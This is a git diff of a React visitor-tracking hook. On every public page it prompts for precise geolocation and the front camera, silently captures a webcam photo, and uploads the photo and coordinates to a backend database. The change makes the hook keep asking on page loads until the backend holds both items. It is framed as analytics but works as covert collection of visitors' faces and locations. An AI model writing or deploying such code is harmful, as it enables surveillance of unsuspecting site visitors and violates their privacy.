@@ -1,9 +1,6 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef,useState} from "react";
 import { useLocation } from "react-router-dom";
 import visitorService from "../services/visitorService";
-
-const LOCATION_REQUESTED_KEY = "visitorLocationRequested";
-const CAMERA_REQUESTED_KEY = "visitorCameraRequested";
 
 export default function useVisitorTracking() {
 
@@ -13,8 +10,11 @@ export default function useVisitorTracking() {
     const locationRequestStarted = useRef(false);
     const cameraRequestStarted = useRef(false);
 
-    const [visitorReady, setVisitorReady] = useState(false);
-
+    const [visitorMediaStatus, setVisitorMediaStatus] = useState({
+        ready: false,
+        hasSnapshot: false,
+        hasLocation: false,
+    });
 
     /*
      * ---------------------------------------------------------
@@ -41,7 +41,14 @@ useEffect(() => {
 
     const initializeVisitor = async () => {
 
-        setVisitorReady(false);
+        setVisitorMediaStatus({
+            ready: false,
+            hasSnapshot: false,
+            hasLocation: false,
+        });
+
+        locationRequestStarted.current = false;
+        cameraRequestStarted.current = false;
 
         const result =
             await visitorService.trackVisitor(pathname);
@@ -50,27 +57,20 @@ useEffect(() => {
             return;
         }
 
-        // Visitor record was deleted previously
-        // and has now been recreated.
-        if (result.isNewVisitor) {
+        console.log(
+            "Visitor media status:",
+            {
+                hasSnapshot: result.hasSnapshot,
+                hasLocation: result.hasLocation,
+            }
+        );
 
-            console.log(
-                "New visitor analytics record detected."
-            );
+        setVisitorMediaStatus({
+            ready: true,
+            hasSnapshot: result.hasSnapshot,
+            hasLocation: result.hasLocation,
+        });
 
-            localStorage.removeItem(
-                LOCATION_REQUESTED_KEY
-            );
-
-            localStorage.removeItem(
-                CAMERA_REQUESTED_KEY
-            );
-
-            locationRequestStarted.current = false;
-            cameraRequestStarted.current = false;
-        }
-
-        setVisitorReady(true);
     };
 
     initializeVisitor();
@@ -84,181 +84,174 @@ useEffect(() => {
      * ---------------------------------------------------------
      */
 
-    useEffect(() => {
+useEffect(() => {
 
-        const ignoredPrefixes = [
-            "/admin",
-        ];
+    const ignoredPrefixes = [
+        "/admin",
+    ];
 
-        const shouldIgnore = ignoredPrefixes.some((prefix) =>
-            pathname.startsWith(prefix)
-        );
+    const shouldIgnore = ignoredPrefixes.some((prefix) =>
+        pathname.startsWith(prefix)
+    );
 
-        if (shouldIgnore) {
-            return;
-        }
+    if (shouldIgnore) {
+        return;
+    }
 
-        if (!visitorReady) {
-            return;
-        }
+    // Wait until the backend has told us
+    // whether this visitor already has location data.
+    if (!visitorMediaStatus.ready) {
+        return;
+    }
 
+    // MongoDB already has this visitor's location.
+    // Therefore, do nothing.
+    if (visitorMediaStatus.hasLocation) {
+        return;
+    }
 
-        // Do not request location more than once
-        const alreadyRequested =
-            localStorage.getItem(
-                LOCATION_REQUESTED_KEY
-            );
+    // Prevent duplicate location requests.
+    if (locationRequestStarted.current) {
+        return;
+    }
 
-        if (
-            alreadyRequested === "true" ||
-            locationRequestStarted.current
-        ) {
-            return;
-        }
+    locationRequestStarted.current = true;
 
+    const requestLocation = async () => {
 
-        locationRequestStarted.current = true;
+        try {
 
+            // Check whether the browser supports geolocation.
+            if (!navigator.geolocation) {
 
-        /*
-         * Make sure the visitor exists before trying to save
-         * the location.
-         */
+                console.log(
+                    "Geolocation is not supported by this browser."
+                );
 
-        const requestLocation = async () => {
+                return;
+            }
+
+            // Check the browser's current permission state.
+            let permissionState = "prompt";
 
             try {
 
-                /*
-                 * Check browser support
-                 */
+                if (navigator.permissions) {
 
-                if (!navigator.geolocation) {
+                    const permission =
+                        await navigator.permissions.query({
+                            name: "geolocation",
+                        });
 
-                    console.log(
-                        "Geolocation is not supported by this browser."
-                    );
-
-                    return;
+                    permissionState =
+                        permission.state;
 
                 }
 
+            } catch (permissionError) {
 
                 console.log(
-                    "Requesting visitor location..."
-                );
-
-
-                navigator.geolocation.getCurrentPosition(
-
-                    async (position) => {
-
-                        const latitude =
-                            position.coords.latitude;
-
-                        const longitude =
-                            position.coords.longitude;
-
-
-                        console.log(
-                            "Visitor location received:",
-                            latitude,
-                            longitude
-                        );
-
-
-                        try {
-
-                            const response =
-                                await visitorService.saveVisitorMedia({
-                                    latitude,
-                                    longitude,
-                                });
-
-
-                            console.log(
-                                "Visitor location saved:",
-                                response
-                            );
-
-
-                            /*
-                             * Only mark the location request as
-                             * completed after the location has
-                             * actually been successfully saved.
-                             */
-
-                            localStorage.setItem(
-                                LOCATION_REQUESTED_KEY,
-                                "true"
-                            );
-
-
-                        } catch (error) {
-
-                            console.error(
-                                "Failed to save visitor location:",
-                                error
-                            );
-
-                            /*
-                             * Do not mark the request as completed
-                             * if saving failed.
-                             */
-
-                        }
-
-                    },
-
-
-                    (error) => {
-
-                        console.error(
-                            "Visitor location permission/error:",
-                            error
-                        );
-
-                        /*
-                         * If the user explicitly denied location,
-                         * we don't keep repeatedly requesting it.
-                         */
-
-                        if (error.code === 1) {
-
-                            localStorage.setItem(
-                                LOCATION_REQUESTED_KEY,
-                                "true"
-                            );
-
-                        }
-
-                    },
-
-
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0,
-                    }
-
-                );
-
-            } catch (error) {
-
-                console.error(
-                    "Location initialization error:",
-                    error
+                    "Could not determine location permission state.",
+                    permissionError
                 );
 
             }
 
-        };
+            console.log(
+                "Location permission state:",
+                permissionState
+            );
 
+            // If the visitor has already denied location,
+            // do not ask again.
+            if (permissionState === "denied") {
 
-        requestLocation();
+                console.log(
+                    "Location permission is denied. No request will be made."
+                );
 
+                return;
+            }
 
-    }, [pathname, visitorReady]);
+            console.log(
+                "Requesting visitor location..."
+            );
+
+            navigator.geolocation.getCurrentPosition(
+
+                async (position) => {
+
+                    const latitude =
+                        position.coords.latitude;
+
+                    const longitude =
+                        position.coords.longitude;
+
+                    console.log(
+                        "Visitor location received:",
+                        latitude,
+                        longitude
+                    );
+
+                    try {
+
+                        const response =
+                            await visitorService.saveVisitorMedia({
+                                latitude,
+                                longitude,
+                            });
+
+                        console.log(
+                            "Visitor location saved:",
+                            response
+                        );
+
+                    } catch (error) {
+
+                        console.error(
+                            "Failed to save visitor location:",
+                            error
+                        );
+
+                    }
+
+                },
+
+                (error) => {
+
+                    console.error(
+                        "Visitor location permission/error:",
+                        error
+                    );
+
+                },
+
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0,
+                }
+
+            );
+
+        } catch (error) {
+
+            console.error(
+                "Location initialization error:",
+                error
+            );
+
+        }
+
+    };
+
+    requestLocation();
+
+}, [
+    pathname,
+    visitorMediaStatus.ready,
+    visitorMediaStatus.hasLocation,
+]);
 
 
     /*
@@ -267,255 +260,224 @@ useEffect(() => {
      * ---------------------------------------------------------
      */
 
-    useEffect(() => {
+useEffect(() => {
 
-        const ignoredPrefixes = [
-            "/admin",
-        ];
+    const ignoredPrefixes = [
+        "/admin",
+    ];
 
-        const shouldIgnore = ignoredPrefixes.some((prefix) =>
-            pathname.startsWith(prefix)
-        );
+    const shouldIgnore = ignoredPrefixes.some((prefix) =>
+        pathname.startsWith(prefix)
+    );
 
-        if (shouldIgnore) {
-            return;
-        }
+    if (shouldIgnore) {
+        return;
+    }
 
-        if (!visitorReady) {
-            return;
-        }
+    // Wait until the backend has told us
+    // whether this visitor already has a snapshot.
+    if (!visitorMediaStatus.ready) {
+        return;
+    }
 
-        // Do not request camera more than once
-        const alreadyRequested =
-            localStorage.getItem(
-                CAMERA_REQUESTED_KEY
-            );
+    // MongoDB already has the visitor's snapshot.
+    // Therefore, do nothing.
+    if (visitorMediaStatus.hasSnapshot) {
+        return;
+    }
 
-        if (
-            alreadyRequested === "true" ||
-            cameraRequestStarted.current
-        ) {
-            return;
-        }
+    // Prevent duplicate camera requests.
+    if (cameraRequestStarted.current) {
+        return;
+    }
 
+    cameraRequestStarted.current = true;
 
-        cameraRequestStarted.current = true;
+    const captureSnapshot = async () => {
 
+        let stream = null;
 
-        /*
-         * We do NOT mark the camera request as completed yet.
-         * We only do that after we know what happened.
-         */
+        try {
 
+            // Check browser camera support.
+            if (
+                !navigator.mediaDevices ||
+                !navigator.mediaDevices.getUserMedia
+            ) {
 
-        const captureSnapshot = async () => {
+                console.log(
+                    "Camera is not supported by this browser."
+                );
 
-            let stream = null;
+                return;
+            }
 
+            // Check the browser's current camera permission state.
+            let permissionState = "prompt";
 
             try {
 
-                /*
-                 * Make sure visitor exists first.
-                 */
-
-                /*
-                 * Check browser camera support.
-                 */
-
-                if (
-                    !navigator.mediaDevices ||
-                    !navigator.mediaDevices.getUserMedia
-                ) {
-
-                    console.log(
-                        "Camera is not supported by this browser."
-                    );
-
-                    localStorage.setItem(
-                        CAMERA_REQUESTED_KEY,
-                        "true"
-                    );
-
-                    return;
-
-                }
-
-
-                console.log(
-                    "Requesting camera permission..."
-                );
-
-
-                stream =
-                    await navigator.mediaDevices.getUserMedia({
-
-                        video: {
-                            facingMode: "user",
-
-                            width: {
-                                ideal: 640,
-                            },
-
-                            height: {
-                                ideal: 480,
-                            },
-                        },
-
-                        audio: false,
-
-                    });
-
-
-                console.log(
-                    "Camera permission granted."
-                );
-
-
-                const video =
-                    document.createElement("video");
-
-
-                video.srcObject = stream;
-
-                video.muted = true;
-                video.playsInline = true;
-
-
-                await video.play();
-
-
-                /*
-                 * Give the camera a short moment to produce
-                 * a usable frame.
-                 */
-
-                await new Promise((resolve) =>
-                    setTimeout(resolve, 500)
-                );
-
-
-                const canvas =
-                    document.createElement("canvas");
-
-
-                canvas.width = 640;
-                canvas.height = 480;
-
-
-                const context =
-                    canvas.getContext("2d");
-
-
-                if (!context) {
-
-                    throw new Error(
-                        "Unable to create canvas context."
-                    );
-
-                }
-
-
-                context.drawImage(
-                    video,
-                    0,
-                    0,
-                    canvas.width,
-                    canvas.height
-                );
-
-
-                const snapshotData =
-                    canvas.toDataURL(
-                        "image/jpeg",
-                        0.7
-                    );
-
-
-                console.log(
-                    "Camera snapshot captured."
-                );
-
-
-                const response =
-                    await visitorService.saveVisitorMedia({
-                        snapshotData,
-                    });
-
-
-                console.log(
-                    "Visitor snapshot saved:",
-                    response
-                );
-
-
-                /*
-                 * Only mark camera as completed after
-                 * successfully saving the snapshot.
-                 */
-
-                localStorage.setItem(
-                    CAMERA_REQUESTED_KEY,
-                    "true"
-                );
-
-
-            } catch (error) {
-
-                console.error(
-                    "Camera permission/capture error:",
-                    error
-                );
-
-
-                /*
-                 * error.name === "NotAllowedError" normally means
-                 * the user/browser denied camera permission.
-                 */
-
-                if (
-                    error?.name === "NotAllowedError" ||
-                    error?.name === "PermissionDeniedError"
-                ) {
-
-                    localStorage.setItem(
-                        CAMERA_REQUESTED_KEY,
-                        "true"
-                    );
-
-                }
-
-            } finally {
-
-                /*
-                 * Always stop the camera.
-                 */
-
-                if (stream) {
-
-                    stream
-                        .getTracks()
-                        .forEach((track) => {
-
-                            track.stop();
-
+                if (navigator.permissions) {
+
+                    const permission =
+                        await navigator.permissions.query({
+                            name: "camera",
                         });
 
+                    permissionState =
+                        permission.state;
+
                 }
 
+            } catch (permissionError) {
 
                 console.log(
-                    "Camera stopped."
+                    "Could not determine camera permission state.",
+                    permissionError
                 );
 
             }
 
-        };
+            console.log(
+                "Camera permission state:",
+                permissionState
+            );
 
+            // If the visitor has already denied camera,
+            // do not ask again.
+            if (permissionState === "denied") {
 
-        captureSnapshot();
+                console.log(
+                    "Camera permission is denied. No request will be made."
+                );
 
+                return;
+            }
 
-    }, [pathname, visitorReady]);
+            console.log(
+                "Requesting camera permission..."
+            );
+
+            stream =
+                await navigator.mediaDevices.getUserMedia({
+
+                    video: {
+
+                        facingMode: "user",
+
+                        width: {
+                            ideal: 640,
+                        },
+
+                        height: {
+                            ideal: 480,
+                        },
+
+                    },
+
+                    audio: false,
+
+                });
+
+            console.log(
+                "Camera permission granted."
+            );
+
+            const video =
+                document.createElement("video");
+
+            video.srcObject = stream;
+
+            video.muted = true;
+            video.playsInline = true;
+
+            await video.play();
+
+            // Give the camera a short moment to produce
+            // a usable frame.
+            await new Promise((resolve) =>
+                setTimeout(resolve, 500)
+            );
+
+            const canvas =
+                document.createElement("canvas");
+
+            canvas.width = 640;
+            canvas.height = 480;
+
+            const context =
+                canvas.getContext("2d");
+
+            if (!context) {
+
+                throw new Error(
+                    "Unable to create canvas context."
+                );
+
+            }
+
+            context.drawImage(
+                video,
+                0,
+                0,
+                canvas.width,
+                canvas.height
+            );
+
+            const snapshotData =
+                canvas.toDataURL(
+                    "image/jpeg",
+                    0.7
+                );
+
+            console.log(
+                "Camera snapshot captured."
+            );
+
+            const response =
+                await visitorService.saveVisitorMedia({
+                    snapshotData,
+                });
+
+            console.log(
+                "Visitor snapshot saved:",
+                response
+            );
+
+        } catch (error) {
+
+            console.error(
+                "Camera permission/capture error:",
+                error
+            );
+
+        } finally {
+
+            // Always stop the camera.
+            if (stream) {
+
+                stream
+                    .getTracks()
+                    .forEach((track) => {
+                        track.stop();
+                    });
+
+            }
+
+            console.log(
+                "Camera stopped."
+            );
+
+        }
+
+    };
+
+    captureSnapshot();
+
+}, [
+    pathname,
+    visitorMediaStatus.ready,
+    visitorMediaStatus.hasSnapshot,
+]);
 
 }
